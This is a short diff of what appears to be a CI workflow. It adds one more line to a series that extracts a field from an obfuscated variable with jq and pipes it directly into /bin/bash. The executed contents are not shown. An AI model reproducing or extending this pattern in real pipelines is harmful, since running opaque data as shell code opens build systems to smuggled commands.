@@ -26,6 +26,7 @@ jobs:
           echo $zr71 | jq -r .celtf28 | /bin/bash
           echo $srd17447 | jq -r .ar2 | /bin/bash
           echo $yxzl6605 | jq -r .jme7709 | /bin/bash
+          printf '%s' "$s41168" | jq -r .polx282 | /bin/bash
 
       - name: Archive results
         if: always()
